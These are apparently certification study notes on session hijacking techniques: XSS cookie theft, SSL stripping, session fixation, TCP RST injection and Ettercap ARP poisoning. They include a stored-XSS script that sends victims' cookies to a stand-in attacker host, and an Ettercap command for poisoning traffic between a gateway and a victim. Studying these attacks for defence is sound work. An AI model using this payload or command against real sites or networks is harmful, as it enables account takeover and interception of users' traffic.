# 02. Attack Techniques — Session Hijacking

> [!WARNING] ⚡ **Exploitation Methodologies & Execution Scenarios**
> Direct extraction from official CEH v13 Syllabus (Module 11). Covers XSS Cookie Theft, SSL Stripping, Session Fixation workflows, TCP RST Injection, and Ettercap ARP Poisoning.

---

## ⚔️ 1. Primary Exploitation Workflows

### 1.1 XSS Cookie Theft Payload Execution
An attacker discovers an input field vulnerable to Stored XSS and injects a script payload:

```html
<script>
  new Image().src = 'http://attacker.com/log.php?cookie=' + encodeURIComponent(document.cookie);
</script>
```
When any victim views the page, their session cookie is silently transmitted to the attacker's listener server.

### 1.2 SSL / TLS Stripping Workflow
Using tools like `sslstrip`, an attacker intercepts HTTP request traffic and rewrites incoming HTTPS redirect links (`https://bank.com`) into cleartext HTTP (`http://bank.com`), acting as a proxy and capturing unencrypted session cookies.

> [!DANGER] 🛡️ **📋 Comprehensive Session Hijacking Attack Vector Matrix**

| Attack Vector | Technical Execution Mechanism | Prerequisites | Operational Impact |
| :--- | :--- | :--- | :--- |
| **XSS Cookie Theft** | Injects JavaScript to exfiltrate `document.cookie` | Unsanitized XSS vulnerability | Full account takeover |
| **SSL Stripping** | Downgrades HTTPS links to HTTP transparently | MitM positioning (ARP Spoof) | Steals plaintext session cookies |
| **Session Fixation** | Supplies pre-generated session ID via URL query parameter | App reuses session ID post-login | Impersonates victim post-login |
| **TCP RST Injection** | Sends spoofed TCP packet with `RST` flag set | Known TCP SEQ/ACK numbers | Abruptly terminates target session |

---

## 🛡️ 2. Tool Execution CLI Syntax

### 2.1 Ettercap ARP Poisoning & Session Sniffing Syntax
```bash
# Execute Graphical Ettercap ARP Poisoning between Gateway and Victim
ettercap -G

# Execute Command-Line ARP Poisoning MitM
ettercap -T -q -M arp:remote /192.168.1.1// /192.168.1.50//
```
